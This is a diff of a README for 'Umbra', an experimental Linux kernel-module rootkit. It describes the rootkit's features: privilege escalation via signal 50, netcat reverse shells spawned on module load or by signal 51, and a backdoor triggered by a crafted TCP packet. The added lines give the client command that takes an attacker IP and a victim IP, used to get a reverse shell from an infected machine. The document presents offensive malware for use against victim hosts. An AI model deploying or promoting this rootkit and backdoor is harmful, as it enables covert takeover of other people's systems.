@@ -9,10 +9,12 @@ Umbra (/ˈʌmbrə/) is an experimental LKM rootkit for kernels 4.x and 5.x (up t
 
 The rootkit is still under development, although the features listed below are already fully operational.
 
+![Backdoor in action](https://github.com/h3xduck/Umbra/blob/magic_packets/images/umbrabackdoor.gif)
+
 Note: This rootkit has been developed and tested using kernel 5.4.0 and Ubuntu 18.04.
 
 ## Features
-* **NEW**: Backdoor which spawns reverse shell to remote IP after receiving specially crafter TCP packet.
+* **NEW**: Backdoor which spawns reverse shell to remote IP after receiving a malicious TCP packet.
 * Privilege escalation by sending signal 50.
 * Spawn netcat reverse shell on module load.
 * Spawn netcat reverse shell to a remote host by sending signal 51.
@@ -80,7 +82,14 @@ Any host can get a reverse shell by sending a specially-crafted packet to a mach
 
 You can look at the code to know how to build your own packet, but I also provide a client which will do the job for you. You can download the client from [latest releases](https://github.com/h3xduck/Umbra/releases/), or you can build your own using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).
 
-![Backdoor in action](https://github.com/h3xduck/Umbra/blob/magic_packets/images/umbrabackdoor.gif)
+The client is run as follows:
+
+```
+./client <attacker_ip> <victim_ip>
+```
+Where the attacker ip will be used by the backdoor to connect the reverse shell and the victim ip is the one of the machine infected with Umbra.
+
+
 
 
 
